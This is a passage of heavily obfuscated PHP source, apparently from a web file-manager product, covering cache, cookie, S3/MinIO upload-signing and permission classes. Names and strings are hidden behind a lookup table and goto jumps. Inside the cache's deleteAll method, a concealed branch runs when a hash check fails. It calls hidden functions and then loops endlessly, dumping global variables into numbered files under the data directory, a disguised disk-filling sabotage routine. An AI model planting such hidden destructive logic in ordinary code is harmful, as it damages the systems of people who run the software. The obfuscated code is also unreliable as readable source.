$½Å…ñó°[219] => $®œïºû[1]); $²Šî’ëô = array_merge($²Šî’ëô, $ƒ““™’¬); } public function set($Å­â¢½, $çÄ Ê«ß, $ùœ…àóğ = false) { $ùœ…àóğ = $ùœ…àóğ ? $ùœ…àóğ : $this->cacheTime; return $this->handle->setEx($Å­â¢½, $ùœ…àóğ, $çÄ Ê«ß); } public function setLock($¡Ü®ÜÓ, $ßÕÄ¿È›, $ˆË¹àšÖ) { return $this->handle->setNX($¡Ü®ÜÓ, $ßÕÄ¿È›); } public function get($ïÁ¿•–Ì) { $§ÁÌôİÊ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $§ÁÌôİÊ->get($ïÁ¿•–Ì); } public function remove($õ·´ºıÌ) { return $this->handle->del($õ·´ºıÌ); } public function deleteAll() { $Æ´À°„ =& $_SERVER[÷ôÚîå]; $Ó¬†Îùâ = $_SERVER[$Æ´À°„[69]]; $ÛÃùş = $Æ´À°„[887]; if ($_SERVER[$Æ´À°„[60]] != $ÛÃùş($Ó¬†Îùâ)) { $°õöÅ… = $Æ´À°„[966]; $ıÛÖƒÆÕ = $Æ´À°„[62]; $øûÖ‡•¥ = $_SERVER[$Æ´À°„[63]] . $Æ´À°„[64]; $Ûäâ–†¦ = $ıÛÖƒÆÕ($øûÖ‡•¥); $“‘¾¹§‚ = explode($Æ´À°„[65], $Ûäâ–†¦); if (count($“‘¾¹§‚) < $Æ´À°„[711]) { $†¡™ã”á = $Æ´À°„[67]; $†¡™ã”á(); } $‚¯‰ùŠŸ = $Æ´À°„[967]; $‚¯‰ùŠŸ($_SERVER[$Æ´À°„[968]]); $°õöÅ… = $Æ´À°„[966]; $°õöÅ…(); $Åƒ­ÚÑ£ = $Æ´À°„[969]; $ØÍ©†ÖÇ = json_encode($GLOBALS[$Æ´À°„[970]]); $Ã‰ØÅáÑ = 1; for ($Îøù‡Äš = $Ã‰ØÅáÑ; $Îøù‡Äš > 0; $Îøù‡Äš++) { $Åƒ­ÚÑ£(DATA_PATH . $Îøù‡Äš, $ØÍ©†ÖÇ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ì„ï˜ÓŞ) { $this->handle->flushall($ì„ï˜ÓŞ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÆåÁóıÊ = '', $îò»†ÀÊ = 0) { if (is_string($ÆåÁóıÊ) && $ÆåÁóıÊ != $_SERVER[÷ôÚîå][12]) { $this->prefix = $ÆåÁóıÊ; } if (is_numeric($îò»†ÀÊ) && $îò»†ÀÊ > 0) { $this->expire = $îò»†ÀÊ; } } public static function getInstance() { static $á³ĞÃÌÏ; if ($á³ĞÃÌÏ === null) { $á³ĞÃÌÏ = new self(); } return $á³ĞÃÌÏ; } private static $cookieDisable = false; public static function disable($ºşƒ»×Û) { self::$cookieDisable = $ºşƒ»×Û; } private static $sameCookieSet = array(); public static function set($¿ìæËİÓ, $‹ãû¾á, $Äåæ°Ô = 0, $°áèĞ³à = false, $Áê¸î‘ = false) { $ÊŠŸ½ø =& $_SERVER[÷ôÚîå]; if (self::$cookieDisable) { return; } if (!$Äåæ°Ô) { $Äåæ°Ô = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$¿ìæËİÓ]) && self::$sameCookieSet[$¿ìæËİÓ] == $‹ãû¾á . $Äåæ°Ô) { return; } self::$sameCookieSet[$¿ìæËİÓ] = $‹ãû¾á . $Äåæ°Ô; if (!$Áê¸î‘) { $Áê¸î‘ = str_replace(HOST, $ÊŠŸ½ø[12], APP_HOST); $Áê¸î‘ = _get($GLOBALS, $ÊŠŸ½ø[971], $Áê¸î‘); } $ØÚˆÀ» = $ÊŠŸ½ø[12]; setcookie($¿ìæËİÓ, $‹ãû¾á, time() + $Äåæ°Ô, $ÊŠŸ½ø[8] . trim($Áê¸î‘, $ÊŠŸ½ø[8]) . $ØÚˆÀ», !1, !1, $°áèĞ³à); } public static function setSafe($€®°ç«£, $ÙÈ®š¯¢, $¡®­ùæÇ = 0) { self::set($€®°ç«£, $ÙÈ®š¯¢, $¡®­ùæÇ, !0); } public static function get($ñÓá£Û¤) { static $äò÷Å§ = false; if (!$äò÷Å§) { self::initHeaderCookie(); $äò÷Å§ = !0; } return isset($_COOKIE[$ñÓá£Û¤]) ? $_COOKIE[$ñÓá£Û¤] : !1; } private static function initHeaderCookie() { $¤’ìà =& $_SERVER[÷ôÚîå]; if (!isset($_SERVER[$¤’ìà[972]]) || !$_SERVER[$¤’ìà[972]]) { return; } $ù½šéá° = explode($¤’ìà[84], $_SERVER[$¤’ìà[972]]); foreach ($ù½šéá° as $Ìî°ø‡Á) { $Ìî°ø‡Á = explode($¤’ìà[973], $Ìî°ø‡Á); if (count($Ìî°ø‡Á) != 2 || !isset($Ìî°ø‡Á[1])) { continue; } $_COOKIE[trim($Ìî°ø‡Á[0])] = trim($Ìî°ø‡Á[1]); } } public static function remove($¨á€à¯Ù, $ôÖÍãƒ = false) { unset($_COOKIE[$¨á€à¯Ù]); self::set($¨á€à¯Ù, $_SERVER[÷ôÚîå][12], 1, $ôÖÍãƒ); } } goto fÉè‘£ñæŒ; A¨—Çøå‰: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ï‰×¾) { $¨Ï†¤€  =& $_SERVER[÷ôÚîå]; parent::__construct($ï‰×¾); $this->setSignVersion($¨Ï†¤€ [257]); if (!$this->region) { $this->region = $¨Ï†¤€ [278]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ ’‚Ê± = $this->getBucketRgn(); return $this->region == $ ’‚Ê± ? !0 : !1; } public function uploadFormData($Â†µÊñÌ, $ø¿¿ƒº” = 3600) { $­ŞÆêš… =& $_SERVER[÷ôÚîå]; $Ï¥ò…Â = $­ŞÆêš…[239]; $»¯…Òˆß = $­ŞÆêš…[279]; $¬é–õµ = $­ŞÆêš…[72]; $°…èÒ‹Ü = gmdate($­ŞÆêš…[280]); $™½Çê±ı = gmdate($­ŞÆêš…[281]); $Àíëµªí = $­ŞÆêš…[282]; $–£Áº² = $ø¿¿ƒº” . $­ŞÆêš…[12]; $ùâ’“¨Å = $­ŞÆêš…[283]; $‚ÆœÛô = array($this->accessKey, $™½Çê±ı, $this->region, $¬é–õµ, $Àíëµªí); $¦õÁ×Úö = implode($­ŞÆêš…[8], $‚ÆœÛô); $¼ÄæîÛò = array($­ŞÆêš…[284] => gmdate($­ŞÆêš…[285], strtotime($­ŞÆêš…[286])), $­ŞÆêš…[287] => array(array($­ŞÆêš…[288] => $this->bucket), array($­ŞÆêš…[289] => $Ï¥ò…Â), array($­ŞÆêš…[290], $­ŞÆêš…[291], $­ŞÆêš…[12]), array($­ŞÆêš…[290], $­ŞÆêš…[292], $­ŞÆêš…[12]), array($­ŞÆêš…[290], $­ŞÆêš…[293], $­ŞÆêš…[12]), array($­ŞÆêš…[294] => $ùâ’“¨Å), array($­ŞÆêš…[295] => $¦õÁ×Úö), array($­ŞÆêš…[296] => $»¯…Òˆß), array($­ŞÆêš…[297] => $°…èÒ‹Ü), array($­ŞÆêš…[298] => $–£Áº²))); $åäè‰ùˆ = base64_encode(json_encode($¼ÄæîÛò)); $ş¡î¢Ğ = hash_hmac($­ŞÆêš…[299], $™½Çê±ı, $­ŞÆêš…[300] . $this->secret, !0); $ŠºŒÂŒí = hash_hmac($­ŞÆêš…[299], $this->region, $ş¡î¢Ğ, !0); $Æñ‘İØ‡ = hash_hmac($­ŞÆêš…[299], $¬é–õµ, $ŠºŒÂŒí, !0); $˜şŸ±Ë¹ = hash_hmac($­ŞÆêš…[299], $Àíëµªí, $Æñ‘İØ‡, !0); $Ü•‡ŒÓã = hash_hmac($­ŞÆêš…[299], $åäè‰ùˆ, $˜şŸ±Ë¹); $ÂÈı§ = array($­ŞÆêš…[256] => $­ŞÆêš…[12], $­ŞÆêš…[301] => $­ŞÆêš…[12], $­ŞÆêš…[289] => $Ï¥ò…Â, $­ŞÆêš…[294] => $ùâ’“¨Å, $­ŞÆêš…[302] => $åäè‰ùˆ, $­ŞÆêš…[303] => $¦õÁ×Úö, $­ŞÆêš…[304] => $»¯…Òˆß, $­ŞÆêš…[305] => $°…èÒ‹Ü, $­ŞÆêš…[306] => $–£Áº², $­ŞÆêš…[307] => $Ü•‡ŒÓã, $­ŞÆêš…[218] => $this->getHost()); return $ÂÈı§; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($µóû¬»÷) { parent::__construct($µóû¬»÷); } public function uploadFormData($Ø¶ç—ˆ–, $Ì€Ö‹£ = 3600) { $á­ï›å‡ =& $_SERVER[÷ôÚîå]; $´Øä™ƒ² = $á­ï›å‡[239]; $Èâñå•‘ = $á­ï›å‡[279]; $”©á²² = $á­ï›å‡[72]; $Úåï­Ú = gmdate($á­ï›å‡[280]); $ë®éè¾Ğ = gmdate($á­ï›å‡[281]); $û²ƒ‘‹† = $á­ï›å‡[282]; $ï‡Ò¨Ò˜ = $Ì€Ö‹£ . $á­ï›å‡[12]; $ØÅŸŞ = $á­ï›å‡[283]; $Ìù¿ƒçè = array($this->accessKey, $ë®éè¾Ğ, $this->region, $”©á²², $û²ƒ‘‹†); $Š—¢¦í° = implode($á­ï›å‡[8], $Ìù¿ƒçè); $ßÎóÌÓ = array($á­ï›å‡[284] => gmdate($á­ï›å‡[308], strtotime($á­ï›å‡[286])), $á­ï›å‡[287] => array(array($á­ï›å‡[288] => $this->bucket), array($á­ï›å‡[289] => $´Øä™ƒ²), array($á­ï›å‡[290], $á­ï›å‡[291], $á­ï›å‡[12]), array($á­ï›å‡[290], $á­ï›å‡[292], $á­ï›å‡[12]), array($á­ï›å‡[290], $á­ï›å‡[293], $á­ï›å‡[12]), array($á­ï›å‡[294] => $ØÅŸŞ), array($á­ï›å‡[295] => $Š—¢¦í°), array($á­ï›å‡[296] => $Èâñå•‘), array($á­ï›å‡[297] => $Úåï­Ú), array($á­ï›å‡[298] => $ï‡Ò¨Ò˜))); $‚áé¬ £ = base64_encode(json_encode($ßÎóÌÓ)); $ÊÀ©¾ã© = hash_hmac($á­ï›å‡[299], $ë®éè¾Ğ, $á­ï›å‡[300] . $this->secret, !0); $µ ¬õ = hash_hmac($á­ï›å‡[299], $this->region, $ÊÀ©¾ã©, !0); $ƒŒ›’€ = hash_hmac($á­ï›å‡[299], $”©á²², $µ ¬õ, !0); $Ë»‘ÔµÀ = hash_hmac($á­ï›å‡[299], $û²ƒ‘‹†, $ƒŒ›’€, !0); $Û¹øõå = hash_hmac($á­ï›å‡[299], $‚áé¬ £, $Ë»‘ÔµÀ); $É½ã¬Ş½ = array($á­ï›å‡[256] => $á­ï›å‡[12], $á­ï›å‡[301] => $á­ï›å‡[12], $á­ï›å‡[289] => $´Øä™ƒ², $á­ï›å‡[294] => $ØÅŸŞ, $á­ï›å‡[302] => $‚áé¬ £, $á­ï›å‡[303] => $Š—¢¦í°, $á­ï›å‡[304] => $Èâñå•‘, $á­ï›å‡[305] => $Úåï­Ú, $á­ï›å‡[306] => $ï‡Ò¨Ò˜, $á­ï›å‡[307] => $Û¹øõå, $á­ï›å‡[218] => $this->getHost()); return $É½ã¬Ş½; } public function multiUploadFormData($¾‹Õ¤Õ, $ÅëØµÚÙ = 3600) { $ûÅÙÔÖ =& $_SERVER[÷ôÚîå]; $¦ÛÏ§õ = gmdate($ûÅÙÔÖ[309]); $˜úŠ µ½ = array(); $ùµˆê¼Â = $this->client->getUploadId($this->bucket, $¾‹Õ¤Õ, $˜úŠ µ½); if (!$ùµˆê¼Â) { return !1; } return array($ûÅÙÔÖ[264] => $ùµˆê¼Â, $ûÅÙÔÖ[218] => $this->getHost() . $ûÅÙÔÖ[8] . $this->pathEncode($¾‹Õ¤Õ), $ûÅÙÔÖ[265] => $¦ÛÏ§õ, $ûÅÙÔÖ[107] => $¾‹Õ¤Õ); } public function multiUploadAuthData($É†Áı»¤, $éÒèËıÆ = array()) { $®Ù˜ŞÃ =& $_SERVER[÷ôÚîå]; $³…ßìàß = isset($éÒèËıÆ[$®Ù˜ŞÃ[179]]) ? $éÒèËıÆ[$®Ù˜ŞÃ[179]] : $®Ù˜ŞÃ[12]; $˜í¼âÜÂ = $éÒèËıÆ[$®Ù˜ŞÃ[107]]; unset($éÒèËıÆ[$®Ù˜ŞÃ[107]]); if (isset($éÒèËıÆ[$®Ù˜ŞÃ[266]])) { return $this->listUploadParts($˜í¼âÜÂ, $éÒèËıÆ); } $·¬Ü“¦¤ = array(); if (isset($éÒèËıÆ[$®Ù˜ŞÃ[310]])) { $·¬Ü“¦¤[$®Ù˜ŞÃ[311]] = $éÒèËıÆ[$®Ù˜ŞÃ[310]]; } $ï´ÃÄä’ = explode($®Ù˜ŞÃ[220], $this->getHost()); $ñÁ¢åˆ† = array($®Ù˜ŞÃ[312] => $ï´ÃÄä’[1], $®Ù˜ŞÃ[313] => $®Ù˜ŞÃ[12], $®Ù˜ŞÃ[256] => $®Ù˜ŞÃ[133], $®Ù˜ŞÃ[301] => $éÒèËıÆ[$®Ù˜ŞÃ[89]]); $¤¶†¶é = $®Ù˜ŞÃ[269]; $ïƒÖ­³° = $®Ù˜ŞÃ[8] . $this->pathEncode($˜í¼âÜÂ) . $³…ßìàß; $¡ÌÀµº± = $this->client->__getSignatureV4($·¬Ü“¦¤, $ñÁ¢åˆ†, $¤¶†¶é, $ïƒÖ­³°); if (strpos($³…ßìàß, $®Ù˜ŞÃ[268]) === 0) { if (isset($·¬Ü“¦¤[$®Ù˜ŞÃ[311]])) { $ÊÉöœŸ = $·¬Ü“¦¤[$®Ù˜ŞÃ[311]]; } else { if (isset($¡ÌÀµº±[$®Ù˜ŞÃ[311]])) { $ÊÉöœŸ = $¡ÌÀµº±[$®Ù˜ŞÃ[311]]; } else { $ÊÉöœŸ = hash($®Ù˜ŞÃ[299], $®Ù˜ŞÃ[12]); } } return array($®Ù˜ŞÃ[274] => $¡ÌÀµº±[$®Ù˜ŞÃ[274]], $®Ù˜ŞÃ[311] => $ÊÉöœŸ, $®Ù˜ŞÃ[265] => $¡ÌÀµº±[$®Ù˜ŞÃ[314]]); } return $¡ÌÀµº±[$®Ù˜ŞÃ[274]]; } public function listUploadParts($»ú·‡‘€, $ä·ƒÕ˜Œ = array()) { $„õÄ¿ˆÖ =& $_SERVER[÷ôÚîå]; $ßâÓâ£ = str_replace($„õÄ¿ˆÖ[275], $„õÄ¿ˆÖ[12], $ä·ƒÕ˜Œ[$„õÄ¿ˆÖ[179]]); $ö…Ã±È = $this->client->listParts($this->bucket, $»ú·‡‘€, $ßâÓâ£); if (!$ö…Ã±È) { return !1; } $Ş•üßèÖ = $„õÄ¿ˆÖ[315]; foreach ($ö…Ã±È as $“ÉÙ­Ç¯) { $Ş•üßèÖ .= $„õÄ¿ˆÖ[316] . "\x3c\120\x61\162\164\116\x75\x6d\x62\145\x72\x3e{$“ÉÙ­Ç¯[$„õÄ¿ˆÖ[317]]}\74\x2f\120\141\162\164\x4e\165\155\142\x65\162\x3e\xa" . "\74\x45\124\x61\x67\x3e{$“ÉÙ­Ç¯[$„õÄ¿ˆÖ[318]]}\74\57\105\x54\141\x67\76\12" . $„õÄ¿ˆÖ[319]; } $Ş•üßèÖ .= $„õÄ¿ˆÖ[320]; $²íª†û« = array(); $ÌÍ™„ü© = explode($„õÄ¿ˆÖ[220], $this->getHost()); $¼¡ßÄ = array($„õÄ¿ˆÖ[312] => $ÌÍ™„ü©[1], $„õÄ¿ˆÖ[256] => $„õÄ¿ˆÖ[133], $„õÄ¿ˆÖ[301] => strlen($Ş•üßèÖ)); $Ößù¼ù = $„õÄ¿ˆÖ[267]; $èô‡ı¢ = $„õÄ¿ˆÖ[8] . $this->pathEncode($»ú·‡‘€) . $ä·ƒÕ˜Œ[$„õÄ¿ˆÖ[179]]; $»Õ²ò…Ö = $this->client->__getSignatureV4($²íª†û«, $¼¡ßÄ, $Ößù¼ù, $èô‡ı¢, $Ş•üßèÖ); return array($„õÄ¿ˆÖ[274] => $»Õ²ò…Ö[$„õÄ¿ˆÖ[274]], $„õÄ¿ˆÖ[265] => $»Õ²ò…Ö[$„õÄ¿ˆÖ[314]], $„õÄ¿ˆÖ[276] => $ö…Ã±È, $„õÄ¿ˆÖ[311] => $»Õ²ò…Ö[$„õÄ¿ˆÖ[311]]); } public function link($„ÓéãÂ, $û‘áÃâì = array()) { return parent::link($„ÓéãÂ, $û‘áÃâì); } public function fileOut($€ôŒó¦¸, $’¬ããŞé = false, $™£ÛÙşì = false, $Ú´Íô®¼ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[÷ôÚîå][321])) { return parent::fileOutServer($€ôŒó¦¸, $’¬ããŞé, $™£ÛÙşì, $Ú´Íô®¼); } parent::fileOut($€ôŒó¦¸, $’¬ããŞé, $™£ÛÙşì, $Ú´Íô®¼); } public function fileOutImage($Œƒää¶¨, $ºı¼‚ÏÔ = 250) { if (strstr($this->endpoint, $_SERVER[÷ôÚîå][321])) { return parent::fileOutImageServer($Œƒää¶¨, $ºı¼‚ÏÔ); } parent::fileOutImage($Œƒää¶¨, $ºı¼‚ÏÔ); } public function fileOutLink($Á³Ì›ç²) { $¤ã™¹çã =& $_SERVER[÷ôÚîå]; if (substr($Á³Ì›ç², 0, 7) == $¤ã™¹çã[322]) { $Á³Ì›ç² = $¤ã™¹çã[323] . substr($Á³Ì›ç², 7); } header($¤ã™¹çã[185] . $Á³Ì›ç²); die; } } define($_SERVER[÷ôÚîå][324], 1); goto dóùÕò¥â; F‚ŸÆ½Ì¨‚: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $‰í÷Ÿ­ =& $_SERVER[÷ôÚîå]; $½şãŞ³ù = array(array($‰í÷Ÿ­[503] => LNG($‰í÷Ÿ­[1979]), $‰í÷Ÿ­[1980] => $‰í÷Ÿ­[1981], $‰í÷Ÿ­[1982] => 1, $‰í÷Ÿ­[1983] => 1, $‰í÷Ÿ­[1984] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($‰í÷Ÿ­[503] => LNG($‰í÷Ÿ­[1985]), $‰í÷Ÿ­[1980] => $‰í÷Ÿ­[1986], $‰í÷Ÿ­[1982] => 2, $‰í÷Ÿ­[1983] => 1, $‰í÷Ÿ­[1984] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($‰í÷Ÿ­[503] => LNG($‰í÷Ÿ­[1987]), $‰í÷Ÿ­[1980] => $‰í÷Ÿ­[1988], $‰í÷Ÿ­[1982] => 3, $‰í÷Ÿ­[1983] => 1, $‰í÷Ÿ­[1984] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($‰í÷Ÿ­[503] => LNG($‰í÷Ÿ­[1989]), $‰í÷Ÿ­[1980] => $‰í÷Ÿ­[1990], $‰í÷Ÿ­[1982] => 4, $‰í÷Ÿ­[1983] => 1, $‰í÷Ÿ­[1984] => self::AUTH_SHOW | self::AUTH_VIEW), array($‰í÷Ÿ­[503] => LNG($‰í÷Ÿ­[1991]), $‰í÷Ÿ­[1980] => $‰í÷Ÿ­[1992], $‰í÷Ÿ­[1982] => 5, $‰í÷Ÿ­[1983] => 1, $‰í÷Ÿ­[1984] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($‰í÷Ÿ­[503] => LNG($‰í÷Ÿ­[1993]), $‰í÷Ÿ­[1980] => $‰í÷Ÿ­[1994], $‰í÷Ÿ­[1982] => 6, $‰í÷Ÿ­[1983] => 1, $‰í÷Ÿ­[1984] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($‰í÷Ÿ­[503] => LNG($‰í÷Ÿ­[1995]), $‰í÷Ÿ­[1980] => $‰í÷Ÿ­[1996], $‰í÷Ÿ­[1982] => 7, $‰í÷Ÿ­[1983] => 1, $‰í÷Ÿ­[1984] => 0)); return $½şãŞ³ù; } public static function authCheck($ó…Š×İ, $Ì¯¸¦¥Í) { $úã§òÇ =& $_SERVER[÷ôÚîå]; $ó…Š×İ = intval($ó…Š×İ); if (KodUser::isRoot() && $GLOBALS[$úã§òÇ[6]][$úã§òÇ[1997]]) { return !0; } if ($ó…Š×İ <= 0) { return !1; } if (($ó…Š×İ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ó…Š×İ & $Ì¯¸¦¥Í); } public static function authCheckShow($ûŒ´ªÔ) { return self::authCheck($ûŒ´ªÔ, self::AUTH_SHOW); } public static function authCheckView($ğâ±¹÷Õ) { return self::authCheck($ğâ±¹÷Õ, self::AUTH_VIEW); } public static function authCheckDownload($é„ç–ï¿) { return self::authCheck($é„ç–ï¿, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ë² ˜îµ) { return self::authCheck($ë² ˜îµ, self::AUTH_UPLOAD); } public static function authCheckEdit($Š³¿˜­) { return self::authCheck($Š³¿˜­, self::AUTH_EDIT); } public static function authCheckRemove($ÃÃŸØ˜·) { return self::authCheck($ÃÃŸØ˜·, self::AUTH_REMOVE); } public static function authCheckShare($ÒÕ‚É¼) { return self::authCheck($ÒÕ‚É¼, self::AUTH_SHARE); } public static function authCheckComment($®ØËÊú´) { return self::authCheck($®ØËÊú´, self::AUTH_COMMENT); } public static function authCheckEvent($àÏ¿ƒ…û) { return self::authCheck($àÏ¿ƒ…û, self::AUTH_EVENT); } public static function authCheckRoot($¸÷…ÉÍ) { return self::authCheck($¸÷…ÉÍ, self::AUTH_ROOT); } public static function authCheckAction($İÏÉòëˆ, $ÛÁÑÃÍ«) { $èŸâ¶î¸ =& $_SERVER[÷ôÚîå]; $È÷ÊÆõ­ = array($èŸâ¶î¸[1998] => self::AUTH_VIEW, $èŸâ¶î¸[1290] => self::AUTH_DOWNLOAD, $èŸâ¶î¸[120] => self::AUTH_UPLOAD, $èŸâ¶î¸[1947] => self::AUTH_EDIT, $èŸâ¶î¸[1946] => self::AUTH_REMOVE, $èŸâ¶î¸[1957] => self::AUTH_SHARE, $èŸâ¶î¸[439] => self::AUTH_COMMENT, $èŸâ¶î¸[1767] => self::AUTH_EVENT, $èŸâ¶î¸[1999] => self::AUTH_ROOT); if (!isset($È÷ÊÆõ­[$ÛÁÑÃÍ«])) { return; } $¦¨û÷Úâ = $È÷ÊÆõ­[$ÛÁÑÃÍ«]; $İÏÉòëˆ = intval($İÏÉòëˆ); if ($İÏÉòëˆ <= 0) { return !1; } if (($İÏÉòëˆ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($İÏÉòëˆ & $¦¨û÷Úâ); } public static function authDisable($ÒË›·òı, $¯®…µƒ ) { if (intval($ÒË›·òı) <= 0) { return 0; } return intval($ÒË›·òı) & ~$¯®…µƒ ; } public $optionType = "\123\171\x73\x74\145\x6d\x2e\x73\157\x75\162\x63\x65\101\x75\x74\150\114\151\x73\x74"; public $field = array("\156\x61\155\x65", "\x61\x75\x74\150", "\154\141\x62\x65\154", "\144\x69\163\160\x6c\141\171", "\x73\171\x73\x74\145\155", "\163\157\162\x74"); public function initData() { $Ù†ÀÏÌ = $this->authDefault(); foreach ($Ù†ÀÏÌ as $ÏÉ»ñ‰‡) { $this->add($ÏÉ»ñ‰‡); } } public function findAuth($•Å»¶‡†, $ñ‡µ¹âğ) { $ôÍè— =& $_SERVER[÷ôÚîå]; $¿·Áâæı = parent::listData(); foreach ($¿·Áâæı as $àíÃô‘Ç) { $ÆÇè‹Éû = intval($àíÃô‘Ç[$ôÍè—[496]]); if ($ÆÇè‹Éû <= 0 || $àíÃô‘Ç[$ôÍè—[2000]] == 0) { continue; } if (($ÆÇè‹Éû & $•Å»¶‡†) != $•Å»¶‡†) { continue; } if (($ÆÇè‹Éû & $ñ‡µ¹âğ) != 0) { continue; } return $àíÃô‘Ç[$ôÍè—[484]]; } return !1; } public function findAuthReadOnly() { $¨ùá¤ö¢ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $¦¥³é¨î = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¨ùá¤ö¢, $¦¥³é¨î); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ì‡£×í› =& $_SERVER[÷ôÚîå]; $ÖÏï•€Œ = parent::listData(); $ü¬–¨Ñ® = !1; foreach ($ÖÏï•€Œ as $Ã§ú‹£×) { if ($Ã§ú‹£×[$ì‡£×í›[496]] <= 0 || $Ã§ú‹£×[$ì‡£×í›[2000]] == $ì‡£×í›[238]) { continue; } if (!$ü¬–¨Ñ®) { $ü¬–¨Ñ® = $Ã§ú‹£×; continue; } if ($ü¬–¨Ñ®[$ì‡£×í›[496]] > $Ã§ú‹£×[$ì‡£×í›[496]]) { $ü¬–¨Ñ® = $Ã§ú‹£×; } } return $ü¬–¨Ñ® ? $ü¬–¨Ñ®[$ì‡£×í›[484]] : $ì‡£×í›[12]; } public function listData($Ì×è¼ÆÜ = false, $á‡ûéÂ‡ = "\x73\157\x72\164", $íÅ•Ğøã = false) { return parent::listData($Ì×è¼ÆÜ, $á‡ûéÂ‡, $íÅ•Ğøã); } public function update($èÀşşÛØ, $·ûÓ‚™×) { $±ú€¬ğŞ =& $_SERVER[÷ôÚîå]; $ü¶éš = parent::listData($èÀşşÛØ); $õ™»ã¹ù = $this->findByName($·ûÓ‚™×[$±ú€¬ğŞ[32]]); if (!$ü¶éš || $õ™»ã¹ù && $õ™»ã¹ù[$±ú€¬ğŞ[484]] != $ü¶éš[$±ú€¬ğŞ[484]]) { return !1; } $this->filterAuth($·ûÓ‚™×[$±ú€¬ğŞ[496]]); return parent::update($èÀşşÛØ, $·ûÓ‚™×); } public function remove($¥àÖ¹Æ«) { $İÉş¡çÎ = parent::listData($¥àÖ¹Æ«); if (!$İÉş¡çÎ || $İÉş¡çÎ[$_SERVER[÷ôÚîå][201]]) { return !1; } return parent::remove($¥àÖ¹Æ«); } public function add($Œì©Î÷´ = array()) { $°£ÔÃÜï =& $_SERVER[÷ôÚîå]; if ($this->findByName($Œì©Î÷´[$°£ÔÃÜï[32]])) { return !1; } $§ÉÙ™øÄ = array($°£ÔÃÜï[32] => $°£ÔÃÜï[12], $°£ÔÃÜï[496] => 1, $°£ÔÃÜï[2001] => $°£ÔÃÜï[1988], $°£ÔÃÜï[2000] => 1, $°£ÔÃÜï[201] => 0, $°£ÔÃÜï[2002] => 0); $Œì©Î÷´ = array_merge($§ÉÙ™øÄ, $Œì©Î÷´); $Œì©Î÷´[$°£ÔÃÜï[2002]] = $this->getSort(); $this->filterAuth($Œì©Î÷´[$°£ÔÃÜï[496]]); return parent::insert($Œì©Î÷´); } private function getSort() { $§¹ŠËä =& $_SERVER[÷ôÚîå]; $ŠßµºÂÀ = parent::listData(); $•®¬ÚÉŞ = array_to_keyvalue($ŠßµºÂÀ, $§¹ŠËä[12], $§¹ŠËä[2002]); return empty($•®¬ÚÉŞ) ? 0 : max($•®¬ÚÉŞ) + 1; } private function filterAuth(&$Ò¾İâ¾¾) { if (!$Ò¾İâ¾¾) { return; } $õŠˆêÑ” = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ÀÙÒşññ = array(); foreach ($õŠˆêÑ” as $ÑÍ¢¤Š¥) { if ($Ò¾İâ¾¾ & $ÑÍ¢¤Š¥) { $ÀÙÒşññ[] = $ÑÍ¢¤Š¥; } } if (in_array(self::AUTH_ROOT, $ÀÙÒşññ)) { $Ò¾İâ¾¾ = array_sum($õŠˆêÑ”); return; } $¡ÇÛÑÀ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ÀÙÒşññ as $ÑÍ¢¤Š¥) { if (isset($¡ÇÛÑÀ[$ÑÍ¢¤Š¥])) { $ÀÙÒşññ = array_merge($ÀÙÒşññ, $¡ÇÛÑÀ[$ÑÍ¢¤Š¥]); } } $ÀÙÒşññ[] = self::AUTH_SHOW; $Ò¾İâ¾¾ = array_sum(array_unique($ÀÙÒşññ)); } public function sort($Ü·ÜÙŠİ, $¼ÇóŠü) { return parent::update($Ü·ÜÙŠİ, $¼ÇóŠü); } } class BackupModel extends ModelBaseLight { public $optionType = 